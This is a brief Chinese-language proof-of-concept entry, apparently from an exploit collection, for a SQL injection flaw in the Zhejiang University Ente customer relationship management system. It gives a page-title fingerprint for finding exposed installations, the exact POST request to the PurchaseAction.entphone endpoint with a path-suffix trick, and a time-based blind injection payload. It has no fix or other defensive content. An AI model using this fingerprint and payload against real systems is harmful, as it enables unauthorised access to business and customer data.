# 浙大恩特客户资源管理系统-purchaseaction.entphone接口存在SQL漏洞

浙大恩特客户资源管理系统-purchaseaction.entphone接口 ｜ 其他 ｜ —
- **指纹**：`title="欢迎使用浙大恩特客户资源管理系统"`
- **请求**：`POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1`

**Payload**
```
modNum=1';WAITFOR DELAY '0:0:4'--+
```